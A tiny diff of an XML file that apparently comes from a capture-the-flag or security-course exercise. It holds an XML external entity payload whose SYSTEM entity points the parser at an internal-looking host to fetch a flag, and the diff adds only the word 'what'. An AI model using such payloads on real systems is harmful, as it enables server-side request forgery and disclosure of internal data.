@@ -3,3 +3,4 @@
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://v1.feedifier.quoccabank.com/flag_66cc7da521fa97f7909f623cf11dcfd4" >]>
 <foo>&xxe;</foo>
+what
